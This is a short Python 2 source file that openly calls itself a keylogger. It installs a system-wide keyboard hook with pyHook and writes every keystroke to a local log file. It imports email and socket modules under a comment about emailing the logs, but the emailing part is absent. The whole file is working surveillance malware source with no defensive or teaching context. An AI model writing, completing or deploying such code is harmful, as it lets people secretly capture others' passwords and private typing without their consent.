#! python2 
# Python keylogger (run with python2)

import sys
import logging
import time

# Modules for keylogging
import pythoncom, pyHook
# Modules for emailing logged files
import smtplib, socket, getpass

log = "" 
logdir = "loggedfiles\log.txt"

openfile = open(logdir, "w")
openfile.write("")

def OnKeyboardEvent(event):
	try:
		global log
		if event.Ascii == 27:
			log = "[ESC]"
		elif event.Ascii == 8:
			log = "[Backspace]"
			
		elif event.Ascii == 17:
			openfile.close()
			sys.exit()
		
		elif event.Ascii == 13:
			log = "\n"
		elif event.Ascii == 0:
			log = ""
		else:
			log = chr(event.Ascii)
			print(chr(event.Ascii))
		openfile.write(log)
		
	except:
		pass
def main():	
	hm = pyHook.HookManager()
	hm.KeyDown = OnKeyboardEvent
	hm.HookKeyboard()
	
	while True:
		pythoncom.PumpMessages()
		
main()
	